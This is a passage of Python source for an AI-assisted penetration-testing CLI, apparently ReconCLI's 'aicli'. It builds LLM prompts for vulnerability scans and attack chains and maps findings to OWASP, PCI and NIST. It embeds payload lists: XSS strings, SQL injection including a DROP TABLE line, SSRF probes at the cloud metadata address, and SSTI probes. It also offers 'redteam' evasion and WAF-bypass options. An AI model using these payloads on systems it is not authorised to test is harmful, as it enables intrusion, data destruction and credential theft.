        """Calculate detailed risk metrics from flow data"""
        attack_types = flow_data.get("attack_types", [])
        risk_level = flow_data.get("risk_level", "UNKNOWN")

        # Risk scoring based on attack types
        risk_scores = {
            "xss": {"likelihood": 8, "impact": 6},
            "sqli": {"likelihood": 7, "impact": 9},
            "lfi": {"likelihood": 5, "impact": 8},
            "ssrf": {"likelihood": 6, "impact": 7},
            "ssti": {"likelihood": 4, "impact": 9},
        }

        total_likelihood = 0
        total_impact = 0

        for attack_type in attack_types:
            if attack_type in risk_scores:
                total_likelihood += risk_scores[attack_type]["likelihood"]
                total_impact += risk_scores[attack_type]["impact"]

        avg_likelihood = total_likelihood / len(attack_types) if attack_types else 0
        avg_impact = total_impact / len(attack_types) if attack_types else 0

        # Calculate composite risk score
        composite_score = (avg_likelihood * avg_impact) / 10

        return {
            "likelihood_score": round(avg_likelihood, 2),
            "impact_score": round(avg_impact, 2),
            "composite_risk_score": round(composite_score, 2),
            "risk_level": risk_level,
            "attack_complexity": len(attack_types),
            "severity_rating": self._get_severity_rating(composite_score),
        }

    def _get_severity_rating(self, composite_score: float) -> str:
        """Convert composite score to severity rating"""
        if composite_score >= 8.0:
            return "CRITICAL"
        elif composite_score >= 6.0:
            return "HIGH"
        elif composite_score >= 4.0:
            return "MEDIUM"
        elif composite_score >= 2.0:
            return "LOW"
        else:
            return "INFORMATIONAL"

    def _generate_compliance_notes(
        self, attack_types: List[str], mitre_mapping: Dict
    ) -> Dict:
        """Generate compliance and regulatory notes"""

        # Map attack types to compliance frameworks
        compliance_mapping = {
            "xss": ["OWASP Top 10 A03", "PCI DSS 6.5.7", "NIST SP 800-53 SI-10"],
            "sqli": ["OWASP Top 10 A03", "PCI DSS 6.5.1", "NIST SP 800-53 SI-10"],
            "lfi": ["OWASP Top 10 A06", "NIST SP 800-53 AC-3", "ISO 27001 A.9.4.2"],
            "ssrf": ["OWASP Top 10 A10", "NIST SP 800-53 SC-7", "ISO 27001 A.13.1.3"],
            "ssti": ["OWASP Top 10 A03", "NIST SP 800-53 SI-10", "ISO 27001 A.14.2.5"],
        }

        applicable_standards = set()
        for attack_type in attack_types:
            if attack_type in compliance_mapping:
                applicable_standards.update(compliance_mapping[attack_type])

        return {
            "applicable_standards": list(applicable_standards),
            "owasp_categories": [std for std in applicable_standards if "OWASP" in std],
            "nist_controls": [std for std in applicable_standards if "NIST" in std],
            "iso_controls": [std for std in applicable_standards if "ISO" in std],
            "pci_requirements": [std for std in applicable_standards if "PCI" in std],
            "mitre_technique_count": sum(
                len(techs) for techs in mitre_mapping.values()
            ),
            "compliance_summary": f"Assessment covers {len(applicable_standards)} compliance requirements across {len(attack_types)} attack vectors",
        }

    def ai_vulnerability_scan(
        self,
        targets: List[str],
        scan_type: str = "comprehensive",
        persona: Optional[str] = None,
        integration_data: Optional[Dict] = None,
    ) -> Dict:
        """AI-Powered Vulnerability Scanner with ReconCLI integration"""

        # Validate scan types
        valid_scan_types = ["quick", "comprehensive", "focused", "deep", "compliance"]
        if scan_type not in valid_scan_types:
            return {
                "error": f"Invalid scan type: {scan_type}. Valid: {valid_scan_types}"
            }

        # Process integration data from ReconCLI modules
        recon_context = ""
        if integration_data:
            recon_context = self._process_integration_data(integration_data)

        # Build AI vulnerability assessment prompt
        vuln_prompt = f"""
        Perform AI-powered vulnerability assessment on the following targets:

        **Targets:** {', '.join(targets)}
        **Scan Type:** {scan_type}
        **ReconCLI Integration Data:**
        {recon_context}

        Analyze based on scan type:

        QUICK SCAN:
        - Common web vulnerabilities (XSS, SQLi, CSRF)
        - Basic authentication bypasses
        - Directory traversal attempts
        - Input validation issues

        COMPREHENSIVE SCAN:
        - All quick scan vulnerabilities plus:
        - Advanced injection techniques
        - Business logic flaws
        - Session management issues
        - Authorization bypasses
        - API security assessment

        FOCUSED SCAN:
        - Target specific technology stack vulnerabilities
        - Framework-specific attacks
        - Version-specific exploits
        - Configuration weaknesses

        DEEP SCAN:
        - Advanced persistent threats simulation
        - Complex attack chain development
        - Zero-day like vulnerability discovery
        - Custom payload generation

        COMPLIANCE SCAN:
        - OWASP Top 10 assessment
        - PCI DSS compliance checks
        - GDPR security requirements
        - SOC2 security controls

        Provide:
        1. Vulnerability prioritization matrix
        2. Exploitation difficulty assessment
        3. Business impact analysis
        4. Specific payload recommendations
        5. Remediation guidance with timelines
        6. Integration with ReconCLI findings

        Format as structured vulnerability report with CVSS scoring.
        """

        # Get AI analysis
        ai_analysis = self.ask_ai(vuln_prompt, context="payload", persona=persona)

        # Generate specific vulnerability tests
        vulnerability_tests = self._generate_vulnerability_tests(targets, scan_type)

        # Create comprehensive scan results
        scan_results = {
            "scan_metadata": {
                "targets": targets,
                "scan_type": scan_type,
                "persona": persona or "default",
                "timestamp": datetime.now().isoformat(),
                "integration_source": "ReconCLI",
            },
            "ai_analysis": ai_analysis,
            "vulnerability_tests": vulnerability_tests,
            "risk_assessment": self._assess_vulnerability_risk(targets, scan_type),
            "integration_insights": self._extract_integration_insights(
                integration_data
            ),
            "recommended_actions": self._generate_vuln_recommendations(
                ai_analysis or ""
            ),
            "compliance_mapping": self._map_vulnerabilities_to_compliance(scan_type),
        }

        return scan_results

    def _process_integration_data(self, integration_data: Dict) -> str:
        """Process data from ReconCLI modules for vulnerability context"""
        context_parts = []

        # Process subdomain enumeration data
        if "subdomains" in integration_data:
            subs = integration_data["subdomains"]
            context_parts.append(
                f"Discovered {len(subs)} subdomains: {', '.join(subs[:10])}"
            )

        # Process HTTP discovery data
        if "http_services" in integration_data:
            services = integration_data["http_services"]
            context_parts.append(f"Active HTTP services: {len(services)} endpoints")

        # Process technology detection
        if "technologies" in integration_data:
            techs = integration_data["technologies"]
            context_parts.append(f"Detected technologies: {', '.join(techs)}")

        # Process URL discovery
        if "urls" in integration_data:
            urls = integration_data["urls"]
            context_parts.append(f"Discovered {len(urls)} URLs/endpoints")

        # Process vulnerability scan results
        if "existing_vulns" in integration_data:
            vulns = integration_data["existing_vulns"]
            context_parts.append(f"Existing vulnerabilities found: {len(vulns)}")

        return (
            "\n".join(context_parts)
            if context_parts
            else "No integration data available"
        )

    def _generate_vulnerability_tests(self, targets: List[str], scan_type: str) -> Dict:
        """Generate specific vulnerability test cases"""

        test_categories = {
            "quick": ["xss_basic", "sqli_basic", "dir_traversal", "auth_bypass"],
            "comprehensive": [
                "xss_advanced",
                "sqli_advanced",
                "xxe",
                "ssrf",
                "ssti",
                "idor",
                "csrf",
            ],
            "focused": ["tech_specific", "version_exploits", "config_weaknesses"],
            "deep": ["advanced_chains", "custom_payloads", "zero_day_simulation"],
            "compliance": ["owasp_top10", "pci_dss", "gdpr_security", "soc2_controls"],
        }

        selected_tests = test_categories.get(
            scan_type, test_categories["comprehensive"]
        )

        vulnerability_tests = {}
        for test_type in selected_tests:
            vulnerability_tests[test_type] = self._create_test_payload(
                test_type, targets
            )

        return vulnerability_tests

    def _create_test_payload(self, test_type: str, targets: List[str]) -> Dict:
        """Create specific test payloads for vulnerability types"""

        payload_templates = {
            "xss_basic": {
                "payloads": [
                    "<script>alert('XSS')</script>",
                    "<img src=x onerror=alert(1)>",
                    "javascript:alert('XSS')",
                ],
                "parameters": ["q", "search", "input", "data", "name"],
                "description": "Basic XSS detection payloads",
            },
            "xss_advanced": {
                "payloads": [
                    "<svg onload=alert(document.domain)>",
                    "<iframe src=javascript:alert(1)>",
                    '"><script>alert(String.fromCharCode(88,83,83))</script>',
                ],
                "parameters": [
                    "q",
                    "search",
                    "input",
                    "data",
                    "name",
                    "callback",
                    "redirect",
                ],
                "description": "Advanced XSS with WAF bypass techniques",
            },
            "sqli_basic": {
                "payloads": [
                    "' OR '1'='1",
                    "1' UNION SELECT NULL--",
                    "'; DROP TABLE users--",
                ],
                "parameters": ["id", "user", "login", "search", "filter"],
                "description": "Basic SQL injection detection",
            },
            "sqli_advanced": {
                "payloads": [
                    "1' AND (SELECT SUBSTRING(@@version,1,1))='5'--",
                    "1' UNION SELECT schema_name FROM information_schema.schemata--",
                    "1'; WAITFOR DELAY '00:00:05'--",
                ],
                "parameters": [
                    "id",
                    "user",
                    "login",
                    "search",
                    "filter",
                    "order",
                    "limit",
                ],
                "description": "Advanced SQL injection with data extraction",
            },
            "ssrf": {
                "payloads": [
                    "http://localhost:80",
                    "http://169.254.169.254/latest/meta-data/",
                    "gopher://localhost:80/",
                ],
                "parameters": ["url", "callback", "redirect", "fetch", "proxy"],
                "description": "Server-Side Request Forgery detection",
            },
            "ssti": {
                "payloads": ["{{7*7}}", "${7*7}", "<%=7*7%>"],
                "parameters": ["template", "data", "content", "message"],
                "description": "Server-Side Template Injection",
            },
        }

        return payload_templates.get(
            test_type,
            {
                "payloads": ["Test payload for " + test_type],
                "parameters": ["general"],
                "description": f"Generic test for {test_type}",
            },
        )

    def _assess_vulnerability_risk(self, targets: List[str], scan_type: str) -> Dict:
        """Assess risk level based on targets and scan type"""

        risk_factors = {
            "target_count": len(targets),
            "scan_depth": {
                "quick": 2,
                "comprehensive": 4,
                "focused": 3,
                "deep": 5,
                "compliance": 3,
            }.get(scan_type, 3),
            "potential_impact": (
                "HIGH" if scan_type in ["deep", "comprehensive"] else "MEDIUM"
            ),
        }

        # Calculate composite risk score
        base_score = risk_factors["scan_depth"] * 2
        target_multiplier = min(len(targets) * 0.5, 3)  # Cap at 3x multiplier
        composite_score = min(base_score + target_multiplier, 10)

        return {
            "composite_score": round(composite_score, 2),
            "risk_level": self._get_severity_rating(composite_score),
            "factors": risk_factors,
            "recommendation": self._get_risk_recommendation(composite_score),
        }

    def _extract_integration_insights(
        self, integration_data: Optional[Dict]
    ) -> List[str]:
        """Extract actionable insights from ReconCLI integration data"""
        insights = []

        if not integration_data:
            return ["No integration data available for enhanced insights"]

        # Subdomain insights
        if "subdomains" in integration_data:
            sub_count = len(integration_data["subdomains"])
            if sub_count > 50:
                insights.append(
                    f"Large subdomain footprint ({sub_count}) increases attack surface significantly"
                )
            elif sub_count > 10:
                insights.append(
                    f"Moderate subdomain footprint ({sub_count}) requires systematic testing"
                )

        # Technology insights
        if "technologies" in integration_data:
            techs = integration_data["technologies"]
            if any("WordPress" in tech for tech in techs):
                insights.append(
                    "WordPress detected - check for plugin vulnerabilities and version issues"
                )
            if any("Apache" in tech for tech in techs):
                insights.append(
                    "Apache server detected - test for configuration weaknesses"
                )

        # URL insights
        if "urls" in integration_data:
            url_count = len(integration_data["urls"])
            if url_count > 100:
                insights.append(
                    f"Extensive URL discovery ({url_count}) indicates complex application - focus on parameter testing"
                )

        return insights[:10]  # Limit to top 10 insights

    def _generate_vuln_recommendations(self, analysis: str) -> List[str]:
        """Generate vulnerability-specific recommendations"""
        recommendations = []

        # Extract recommendations from AI analysis
        lines = analysis.split("\n")
        for line in lines:
            if any(
                indicator in line.lower()
                for indicator in [
                    "recommend",
                    "suggest",
                    "should",
                    "must",
                    "critical",
                    "fix",
                    "patch",
                ]
            ):
                recommendations.append(line.strip())

        # Add standard vulnerability recommendations
        recommendations.extend(
            [
                "Implement input validation and output encoding",
                "Use parameterized queries to prevent SQL injection",
                "Enable Content Security Policy (CSP) headers",
                "Implement proper authentication and session management",
                "Regular security testing and code reviews",
                "Keep all frameworks and dependencies updated",
            ]
        )

        return recommendations[:15]  # Limit to top 15 recommendations

    def _map_vulnerabilities_to_compliance(self, scan_type: str) -> Dict:
        """Map vulnerability findings to compliance frameworks"""

        compliance_mapping = {
            "quick": {
                "owasp": [
                    "A03:2021 – Injection",
                    "A07:2021 – Identification and Authentication Failures",
                ],
                "pci_dss": ["6.5.1", "6.5.7"],
                "nist": ["SI-10", "AC-2"],
            },
            "comprehensive": {
                "owasp": [
                    "A01:2021 – Broken Access Control",
                    "A03:2021 – Injection",
                    "A07:2021 – Identification and Authentication Failures",
                ],
                "pci_dss": ["6.5.1", "6.5.7", "6.5.8", "6.5.10"],
                "nist": ["SI-10", "AC-2", "AC-3", "SC-7"],
            },
            "compliance": {
                "owasp": ["All OWASP Top 10 2021"],
                "pci_dss": ["6.5.1-6.5.10", "11.2", "11.3"],
                "nist": ["SI-10", "AC-2", "AC-3", "SC-7", "RA-5"],
                "gdpr": ["Article 32 - Security of processing"],
                "soc2": ["CC6.1", "CC6.2", "CC6.3"],
            },
        }

        return compliance_mapping.get(scan_type, compliance_mapping["comprehensive"])

    def _get_risk_recommendation(self, composite_score: float) -> str:
        """Get risk-based recommendations"""
        if composite_score >= 8.0:
            return "IMMEDIATE ACTION REQUIRED - Critical vulnerabilities likely present"
        elif composite_score >= 6.0:
            return "HIGH PRIORITY - Schedule vulnerability remediation within 48 hours"
        elif composite_score >= 4.0:
            return "MEDIUM PRIORITY - Address vulnerabilities within 1 week"
        else:
            return "LOW PRIORITY - Include in regular security maintenance cycle"

    def scan_endpoints_with_ai(
        self,
        endpoints_file: str,
        scan_type: str = "comprehensive",
        persona: Optional[str] = None,
        integration_mode: bool = True,
    ) -> Dict:
        """Scan endpoints from ReconCLI output files with AI analysis"""

        if not os.path.exists(endpoints_file):
            return {"error": f"Endpoints file not found: {endpoints_file}"}

        try:
            # Load endpoints from various ReconCLI output formats
            endpoints_data = self._load_endpoints_file(endpoints_file)

            if not endpoints_data:
                return {"error": "No endpoints found in file"}

            # Extract integration data if available
            integration_data = None
            if integration_mode:
                integration_data = self._extract_recon_data(endpoints_file)

            # Perform AI vulnerability scan
            scan_results = self.ai_vulnerability_scan(
                targets=endpoints_data["endpoints"],
                scan_type=scan_type,
                persona=persona,
                integration_data=integration_data,
            )

            # Add endpoint-specific metadata
            scan_results["endpoint_metadata"] = {
                "source_file": endpoints_file,
                "total_endpoints": len(endpoints_data["endpoints"]),
                "endpoint_types": endpoints_data.get("types", []),
                "scan_timestamp": datetime.now().isoformat(),
            }

            return scan_results

        except Exception as e:
            return {"error": f"Failed to process endpoints file: {str(e)}"}

    def _load_endpoints_file(self, filepath: str) -> Dict:
        """Load endpoints from various ReconCLI output formats"""
        endpoints = []
        endpoint_types = []

        try:
            # Try JSON format first (urlcli, httpcli output)
            if filepath.endswith(".json"):
                with open(filepath, "r") as f:
                    data = json.load(f)

                if isinstance(data, list):
                    endpoints = [item.get("url", str(item)) for item in data if item]
                elif isinstance(data, dict):
                    if "urls" in data:
                        endpoints = data["urls"]
                    elif "endpoints" in data:
                        endpoints = data["endpoints"]
                    elif "results" in data:
                        endpoints = [r.get("url", str(r)) for r in data["results"]]

            # Try text format (common ReconCLI output)
            else:
                with open(filepath, "r") as f:
                    endpoints = [line.strip() for line in f if line.strip()]

            # Categorize endpoint types
            for endpoint in endpoints:
                if any(param in endpoint for param in ["?", "&", "="]):
                    endpoint_types.append("parametrized")
                elif any(ext in endpoint for ext in [".php", ".asp", ".jsp"]):
                    endpoint_types.append("dynamic")
                elif any(ext in endpoint for ext in [".js", ".css", ".png", ".jpg"]):
                    endpoint_types.append("static")
                else:
                    endpoint_types.append("unknown")

            return {
                "endpoints": endpoints[:100],  # Limit to 100 endpoints for performance
                "types": list(set(endpoint_types)),
                "total_found": len(endpoints),
            }

        except Exception as e:
            return {"endpoints": [], "error": str(e)}

    def _extract_recon_data(self, filepath: str) -> Dict:
        """Extract additional reconnaissance data for context"""
        recon_data = {}

        # Try to find related ReconCLI output files
        base_dir = os.path.dirname(filepath)
        base_name = os.path.splitext(os.path.basename(filepath))[0]

        # Look for subdomains file
        subdomain_files = [
            f"{base_name}_subdomains.txt",
            "subs_resolved.txt",
            "subdomains.txt",
        ]

        for sub_file in subdomain_files:
            sub_path = os.path.join(base_dir, sub_file)
            if os.path.exists(sub_path):
                try:
                    with open(sub_path, "r") as f:
                        recon_data["subdomains"] = [
                            line.strip() for line in f if line.strip()
                        ][:50]
                except:
                    pass

        # Look for technology detection file
        tech_files = [f"{base_name}_technologies.json", "tech_detection.json"]

        for tech_file in tech_files:
            tech_path = os.path.join(base_dir, tech_file)
            if os.path.exists(tech_path):
                try:
                    with open(tech_path, "r") as f:
                        tech_data = json.load(f)
                        if isinstance(tech_data, dict) and "technologies" in tech_data:
                            recon_data["technologies"] = tech_data["technologies"]
                        elif isinstance(tech_data, list):
                            recon_data["technologies"] = tech_data
                except:
                    pass

        return recon_data


# Global assistant instance
ai_assistant = AIReconAssistant()


@click.command()
@click.option("--prompt", "-p", help="Ask the AI anything recon-related")
@click.option("--payload", help="Generate payload (xss, sqli, lfi, ssrf, ssti)")
@click.option("--context", help="Payload context (html, js, mysql, linux, etc.)")
@click.option(
    "--technique", help="Specific technique (union, boolean, reflection, gopher, etc.)"
)
@click.option("--plan", help="Generate recon plan for domain")
@click.option(
    "--scope",
    default="comprehensive",
    type=click.Choice(["basic", "comprehensive", "cloud", "api"]),
    help="Reconnaissance scope",
)
@click.option("--analyze", help="Perform AI-powered target analysis")
@click.option(
    "--attack-flow",
    help="Generate multi-stage attack flow (comma-separated: ssrf,xss,lfi,sqli)",
)
@click.option(
    "--report",
    help="Generate comprehensive report from attack flow JSON file",
)
@click.option("--prompt-mode", is_flag=True, help="Enable advanced prompt templates")
@click.option("--save-chat", help="Save current chat history to file")
@click.option("--load-chat", help="Load chat history from file")
@click.option("--list-chats", is_flag=True, help="List available chat histories")
@click.option(
    "--provider",
    type=click.Choice(["openai", "anthropic", "gemini"]),
    help="AI provider to use",
)
@click.option(
    "--persona",
    type=click.Choice(["redteam", "bugbounty", "pentester", "trainer", "osint"]),
    help="AI persona/style (redteam=stealth/evasion, bugbounty=quick wins, pentester=methodology, trainer=educational, osint=passive intel)",
)
@click.option("--session", help="Session ID to resume")
@click.option("--new-session", help="Create new session for target")
@click.option("--list-sessions", is_flag=True, help="List available sessions")
@click.option("--export-plan", help="Export plan to file (json/yaml)")
@click.option("--interactive", "-i", is_flag=True, help="Interactive AI chat mode")
@click.option(
    "--vuln-scan",
    help="AI-powered vulnerability scan of endpoints file (from ReconCLI output)",
)
@click.option(
    "--scan-type",
    default="comprehensive",
    type=click.Choice(["quick", "comprehensive", "focused", "deep", "compliance"]),
    help="Vulnerability scan depth and focus",
)
@click.option("--integration", is_flag=True, help="Enable ReconCLI integration mode")
@click.option("--verbose", "-v", is_flag=True, help="Verbose output")
@click.option("--mutate", is_flag=True, help="Enable advanced payload mutation engine")
@click.option(
    "--mutations",
    default=10,
    type=int,
    help="Number of payload mutations to generate",
)
def aicli(
    prompt,
    payload,
    context,
    technique,
    plan,
    scope,
    analyze,
    attack_flow,
    report,
    prompt_mode,
    save_chat,
    load_chat,
    list_chats,
    provider,
    persona,
    session,
    new_session,
    list_sessions,
    export_plan,
    interactive,
    vuln_scan,
    scan_type,
    integration,
    verbose,
    mutate,
    mutations,
):
    """🧠 Enterprise AI-Powered Reconnaissance Assistant

    Advanced AI module for intelligent recon planning, payload generation, and security analysis.
    Supports multiple AI providers (OpenAI, Anthropic, Gemini) with session management and specialized personas.

    Examples:
        # Generate XSS payload for HTML context with bug bounty persona
        reconcli aicli --payload xss --context html --technique reflection --persona bugbounty

        # Advanced payload mutations with mutation engine
        reconcli aicli --payload sqli --context mysql --mutate --mutations 15 --persona redteam

        # Generate WAF bypass XSS mutations
        reconcli aicli --payload xss --context html --mutate --mutations 20 --technique obfuscation

        # SSRF payload mutations for cloud environments
        reconcli aicli --payload ssrf --context cloud --mutate --persona pentester

        # Create comprehensive recon plan with red team persona
        reconcli aicli --plan example.com --scope comprehensive --persona redteam

        # Analyze target with pentester methodology
        reconcli aicli --analyze example.com --persona pentester --provider openai

        # Multi-stage attack flow with SSRF -> XSS -> LFI chain
        reconcli aicli --attack-flow ssrf,xss,lfi --technique gopher --persona redteam

        # Generate comprehensive report from attack flow
        reconcli aicli --report attack_flow_ssrf_xss_lfi_1234567890.json --persona pentester

        # AI-Powered Vulnerability Scanner with ReconCLI integration
        reconcli aicli --vuln-scan endpoints.txt --scan-type comprehensive --persona pentester

        # Quick vulnerability scan for bug bounty hunting
        reconcli aicli --vuln-scan urlcli_output.json --scan-type quick --persona bugbounty --integration

        # Deep vulnerability assessment with compliance focus
        reconcli aicli --vuln-scan discovered_urls.txt --scan-type compliance --persona pentester

        # Advanced prompt mode for deep reconnaissance
        reconcli aicli --prompt-mode --prompt "threat modeling for banking app" --persona pentester

        # Educational session for learning reconnaissance
        reconcli aicli --prompt "Explain subdomain enumeration" --persona trainer

        # OSINT-focused passive reconnaissance with chat saving
        reconcli aicli --plan target.com --persona osint --save-chat osint_session_2025

        # Load previous chat and continue analysis
        reconcli aicli --load-chat osint_session_2025 --interactive

    Advanced Features:
        --attack-flow    - Multi-vulnerability attack chains (ssrf,xss,lfi,sqli)
        --report         - Generate professional reports from attack flow JSON files
        --vuln-scan      - AI-powered vulnerability scanner with ReconCLI integration
        --scan-type      - Vulnerability scan depth (quick/comprehensive/focused/deep/compliance)
        --integration    - Enable ReconCLI integration mode for enhanced context
        --prompt-mode    - Advanced prompt templates for specialized scenarios
        --save-chat      - Persistent chat history management
        --load-chat      - Resume previous analysis sessions
        --technique      - Specific techniques like gopher, reflection, union, etc.

    Personas:
        redteam    - Stealth operations, evasion techniques, APT-style tactics
        bugbounty  - Quick wins, high-impact vulnerabilities, automation focus
        pentester  - Professional methodology, compliance, documentation
        trainer    - Educational approach, step-by-step explanations
        osint      - Passive intelligence, public sources, no footprint

    Scan Types:
        quick          - Fast scan for common vulnerabilities (XSS, SQLi, CSRF)
        comprehensive  - Complete vulnerability assessment with advanced techniques
        focused        - Technology-specific vulnerability testing
        deep           - Advanced persistent threat simulation and zero-day discovery
        compliance     - OWASP Top 10, PCI DSS, GDPR compliance assessment
    """

    if verbose:
        click.secho("🧠 AI-Powered Reconnaissance Assistant", fg="cyan", bold=True)
        click.secho("Part of the ReconCLI Cyber-Squad z Przyszłości", fg="blue")
        click.secho(
            f"Available providers: {', '.join(ai_assistant.get_available_providers())}",
            fg="green",
        )
        if persona:
            click.secho(f"Active persona: {persona.upper()}", fg="magenta", bold=True)

    # Generate comprehensive report from attack flow JSON
    if report:
        if verbose:
            click.secho(f"[*] Generating report from {report}...", fg="cyan")

        report_data = ai_assistant.generate_report_from_flow(report, persona)

        if "error" in report_data:
            click.secho(f"❌ {report_data['error']}", fg="red")
            return

        click.secho("\n📊 Security Assessment Report", fg="cyan", bold=True)
        click.secho(f"Source: {report}", fg="blue")
        click.secho(
            f"Generated: {report_data['report_metadata']['generated_at']}", fg="blue"
        )

        if persona:
            click.secho(f"Persona: {persona.upper()}", fg="magenta")

        # Display report summary
        summary = report_data["attack_flow_summary"]
        click.secho("\n⚔️  Attack Flow Summary:", fg="yellow", bold=True)
        click.secho(
            f"  Attack Types: {' → '.join(summary['attack_types'])}", fg="white"
        )
        click.secho(f"  Technique: {summary['technique']}", fg="white")
        click.secho(f"  Target: {summary['target']}", fg="white")
        click.secho(
            f"  Risk Level: {summary['risk_level']}",
            fg="red" if summary["risk_level"] == "CRITICAL" else "yellow",
        )

        # Display risk metrics
        risk_metrics = report_data["risk_metrics"]
        click.secho("\n📈 Risk Assessment:", fg="red", bold=True)
        click.secho(
            f"  Likelihood Score: {risk_metrics['likelihood_score']}/10", fg="white"
        )
        click.secho(f"  Impact Score: {risk_metrics['impact_score']}/10", fg="white")
        click.secho(
            f"  Composite Risk: {risk_metrics['composite_risk_score']}/10", fg="white"
        )
        click.secho(
            f"  Severity: {risk_metrics['severity_rating']}",
            fg="red" if risk_metrics["severity_rating"] == "CRITICAL" else "yellow",
        )

        # Display MITRE analysis
        mitre_analysis = report_data["mitre_analysis"]
        if verbose and mitre_analysis["technique_count"] > 0:
            click.secho("\n🎯 MITRE ATT&CK Analysis:", fg="cyan", bold=True)
            click.secho(
                f"  Mapped Techniques: {mitre_analysis['technique_count']}", fg="white"
            )
            click.secho(
                f"  Coverage Areas: {', '.join(mitre_analysis['coverage_areas'])}",
                fg="white",
            )

        # Display compliance information
        compliance = report_data["compliance_notes"]
        if compliance["applicable_standards"]:
            click.secho("\n⚖️  Compliance Impact:", fg="blue", bold=True)
            click.secho(
                f"  Standards: {len(compliance['applicable_standards'])} requirements",
                fg="white",
            )
            if verbose:
                for std in compliance["applicable_standards"][:5]:  # Show first 5
                    click.secho(f"    • {std}", fg="white")
                if len(compliance["applicable_standards"]) > 5:
                    click.secho(
                        f"    ... and {len(compliance['applicable_standards'])-5} more",
                        fg="white",
                    )

        # Display AI-generated report
        click.secho(
            f"\n🧠 Detailed Analysis:\n{report_data['ai_generated_report']}", fg="green"
        )

        # Display key recommendations
        if report_data["recommendations"]:
            click.secho("\n💡 Key Recommendations:", fg="yellow", bold=True)
            for i, rec in enumerate(report_data["recommendations"][:10], 1):
                click.secho(f"{i}. {rec}", fg="green")

        # Save report to file
        report_filename = f"security_report_{int(time.time())}.json"
        with open(report_filename, "w") as f:
            json.dump(report_data, f, indent=2)

        if verbose:
            click.secho(f"💾 Report saved to: {report_filename}", fg="green")

        # Also generate markdown report for easy reading
        markdown_filename = f"security_report_{int(time.time())}.md"
        markdown_content = f"""# Security Assessment Report

**Generated:** {report_data['report_metadata']['generated_at']}  
**Source:** {report}  
**Persona:** {persona or 'default'}  

## Executive Summary

### Attack Flow Details
- **Attack Types:** {' → '.join(summary['attack_types'])}
- **Technique:** {summary['technique']}
- **Target:** {summary['target']}
- **Risk Level:** {summary['risk_level']}

### Risk Assessment
- **Likelihood Score:** {risk_metrics['likelihood_score']}/10
- **Impact Score:** {risk_metrics['impact_score']}/10
- **Composite Risk:** {risk_metrics['composite_risk_score']}/10
- **Severity Rating:** {risk_metrics['severity_rating']}

## Technical Analysis

{report_data['ai_generated_report']}

## MITRE ATT&CK Mapping

- **Mapped Techniques:** {mitre_analysis['technique_count']}
- **Coverage Areas:** {', '.join(mitre_analysis['coverage_areas'])}

## Compliance Impact

{compliance['compliance_summary']}

### Applicable Standards
{chr(10).join(f"- {std}" for std in compliance['applicable_standards'])}

## Key Recommendations

{chr(10).join(f"{i}. {rec}" for i, rec in enumerate(report_data['recommendations'][:10], 1))}

---
*Report generated by ReconCLI AI Assistant*
"""

        with open(markdown_filename, "w") as f:
            f.write(markdown_content)

        click.secho(f"📄 Markdown report saved to: {markdown_filename}", fg="green")

        # Save chat if requested
        if save_chat:
            if ai_assistant.save_chat_history(save_chat):
                click.secho(f"💾 Chat saved to: {save_chat}", fg="green")
            else:
                click.secho(f"❌ Failed to save chat: {save_chat}", fg="red")

        return

    # List available chat histories
    if list_chats:
        chat_files = ai_assistant.list_chat_files()
        if chat_files:
            click.secho("\n💬 Available Chat Histories:", fg="cyan", bold=True)
            for chat_file in chat_files:
                click.secho(f"  {chat_file}", fg="white")
        else:
            click.secho("No chat histories found.", fg="yellow")
        return

    # Create new session
    if new_session:
        session_id = ai_assistant.create_session(new_session)
        click.secho(
            f"✅ Created new session: {session_id} for target: {new_session}",
            fg="green",
        )
        if verbose:
            click.secho(
                f"Session saved to: {ai_assistant.session_dir / f'{session_id}.json'}",
                fg="blue",
            )

    # Load existing session
    if session:
        if ai_assistant.load_session(session):
            click.secho(f"✅ Loaded session: {session}", fg="green")
            if verbose and ai_assistant.current_session:
                click.secho(f"Target: {ai_assistant.current_session.target}", fg="blue")
        else:
            click.secho(f"❌ Session not found: {session}", fg="red")
            return

    # Load chat history
    if load_chat:
        if ai_assistant.load_chat_history(load_chat):
            click.secho(f"✅ Loaded chat history: {load_chat}", fg="green")
            if verbose and ai_assistant.current_session:
                click.secho(f"Target: {ai_assistant.current_session.target}", fg="blue")
                click.secho(
                    f"Chat entries: {len(ai_assistant.current_session.queries)}",
                    fg="blue",
                )
        else:
            click.secho(f"❌ Chat history not found: {load_chat}", fg="red")
            return

    # Enable prompt mode
    if prompt_mode:
        ai_assistant.enable_prompt_mode()
        if verbose:
            click.secho("🔧 Advanced prompt mode enabled", fg="magenta")

    # Generate multi-stage attack flow
    if attack_flow:
        if verbose:
            click.secho(f"[*] Generating attack flow: {attack_flow}...", fg="cyan")

        # Parse attack types
        attack_types = [a.strip() for a in attack_flow.split(",")]

        # Create session if not exists
        if not ai_assistant.current_session:
            target = analyze or "multi-target"
            ai_assistant.create_session(target)

        flow_data = ai_assistant.generate_attack_flow(
            attack_types, technique, analyze, persona
        )

        if "error" in flow_data:
            click.secho(f"❌ {flow_data['error']}", fg="red")
            return

        click.secho("\n⚔️  Multi-Stage Attack Flow", fg="red", bold=True)
        click.secho(f"Attack Chain: {' → '.join(attack_types)}", fg="yellow")
        click.secho(f"Technique: {technique or 'adaptive'}", fg="blue")
        click.secho(
            f"Risk Level: {flow_data['risk_level']}",
            fg="red" if flow_data["risk_level"] == "CRITICAL" else "yellow",
        )

        if persona:
            click.secho(f"Persona: {persona.upper()}", fg="magenta")

        click.secho(f"\n{flow_data['attack_flow']}", fg="white")

        # Show MITRE mapping if verbose
        if verbose and flow_data.get("mitre_mapping"):
            click.secho("\n🎯 MITRE ATT&CK Mapping:", fg="cyan", bold=True)
            for attack_type, techniques in flow_data["mitre_mapping"].items():
                if techniques:
                    click.secho(
                        f"  {attack_type.upper()}: {', '.join(techniques)}", fg="green"
                    )

        # Save attack flow to file
        flow_file = f"attack_flow_{'_'.join(attack_types)}_{int(time.time())}.json"
        with open(flow_file, "w") as f:
            json.dump(flow_data, f, indent=2)

        if verbose:
            click.secho(f"💾 Attack flow saved to: {flow_file}", fg="green")

        # Save chat if requested
        if save_chat:
            if ai_assistant.save_chat_history(save_chat):
                click.secho(f"💾 Chat saved to: {save_chat}", fg="green")
            else:
                click.secho(f"❌ Failed to save chat: {save_chat}", fg="red")

        return

    # AI-Powered Vulnerability Scanner
    if vuln_scan:
        if verbose:
            click.secho(
                f"[*] Starting AI vulnerability scan on {vuln_scan}...", fg="cyan"
            )

        # Create session if not exists
        if not ai_assistant.current_session:
            target = "vulnerability_scan"
            ai_assistant.create_session(target)

        scan_results = ai_assistant.scan_endpoints_with_ai(
